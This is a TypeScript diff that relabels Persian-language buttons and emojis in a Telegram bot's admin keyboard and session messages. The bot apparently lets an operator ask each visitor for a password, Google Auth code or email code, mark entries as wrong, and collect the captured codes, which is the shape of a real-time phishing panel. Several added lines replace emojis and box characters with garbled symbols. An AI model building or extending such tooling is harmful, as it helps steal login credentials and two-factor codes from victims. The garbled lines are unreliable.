@@ -695,7 +695,7 @@ const formatSessionMessage = (session: UserSession): string => {
     return `
 ╔══════════════════════════════════════╗
 ${content}
-╚══════════════���═══════════════════════╝`;
+╚══════════════════════════════════════╝`;
   };
 
   // Main header
@@ -770,7 +770,7 @@ ${createBox(
         const codesContent = codes
           .map(
             (code, index) =>
-              `${index === codes.length - 1 ? "✅" : "��"} کد ${index + 1}: <code>${escapeHtml(code)}</code>`,
+              `${index === codes.length - 1 ? "✅" : "📝"} کد ${index + 1}: <code>${escapeHtml(code)}</code>`,
           )
           .join("\n║ ");
 
@@ -798,7 +798,7 @@ ${createBox(
   // Footer with professional touch
   message += `\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🛡️ <i>سیستم احراز هویت هوشمند والکس</i>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━��━━━━━━━━━━━━━━━━━━━━━━━`;
 
   return message;
 };
@@ -852,7 +852,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Password button - show if not attempted
   if (!session.authAttempts["password"]) {
     authRow.push({
-      text: "🔐 درخواست رمز عبور",
+      text: "🔒 رمز عبور",
       callback_data: `auth_password_${sessionId}`,
     });
     console.log("✅ Added Password button");
@@ -861,7 +861,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Google Auth button - show if not attempted
   if (!session.authAttempts["google"]) {
     authRow.push({
-      text: "📱 احراز هویت دومرحله‌ای",
+      text: "📱 Google Auth",
       callback_data: `auth_google_${sessionId}`,
     });
     console.log("✅ Added Google Auth button");
@@ -879,7 +879,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   if (!session.authAttempts["email"]) {
     buttons.push([
       {
-        text: "📧 درخواست کد ایمیل",
+        text: "📧 کد ایمیل",
         callback_data: `auth_email_${sessionId}`,
       },
     ]);
@@ -889,7 +889,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong SMS button - always available (moved from wrong buttons section)
   buttons.push([
     {
-      text: "❌ شماره اشتباه است",
+      text: "❌ شماره اشتباه",
       callback_data: `incorrect_sms_${sessionId}`,
     },
   ]);
@@ -905,7 +905,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     session.authAttempts["password"] > 0
   ) {
     wrongButtonsRow1.push({
-      text: "🚫 رمز عبور اشتباه",
+      text: "❌ رمز اشتباه",
       callback_data: `incorrect_password_${sessionId}`,
     });
     console.log("✅ Added Wrong Password button");
@@ -914,7 +914,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong Google Auth button - only if user attempted google auth at least once
   if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
     wrongButtonsRow1.push({
-      text: "🚫 کد احراز اشتباه",
+      text: "❌ کد اشتباه",
       callback_data: `incorrect_google_${sessionId}`,
     });
     console.log("✅ Added Wrong Google Auth button");
@@ -925,7 +925,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong Email button - only if user attempted email at least once
   if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
     wrongButtonsRow2.push({
-      text: "🚫 کد ایمیل اشتباه",
+      text: "❌ ایمیل اشتباه",
       callback_data: `incorrect_email_${sessionId}`,
     });
     console.log("✅ Added Wrong Email button");
@@ -943,7 +943,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   if (session.completedSteps.length > 1) {
     buttons.push([
       {
-        text: "✅ تایید نهایی و ورود",
+        text: "✅ تایید ورود",
         callback_data: `complete_auth_${sessionId}`,
       },
     ]);
@@ -1078,7 +1078,7 @@ const updateTelegramMessage = async (
       payload.reply_markup = replyMarkup;
     }
 
-    console.log("🔄 Updating Telegram message:", {
+    console.log("��� Updating Telegram message:", {
       messageId,
       textLength: text.length,
       retryCount,
@@ -1284,7 +1284,7 @@ const formatSessionMessage = (session: UserSession): string => {
     Object.keys(session.authCodes).forEach((stepType) => {
       const stepCodes = session.authCodes[stepType];
       if (stepCodes && stepCodes.length > 0) {
-        let stepEmoji = "🔐";
+        let stepEmoji = "���";
         let stepName = "";
 
         // Choose appropriate emoji and name
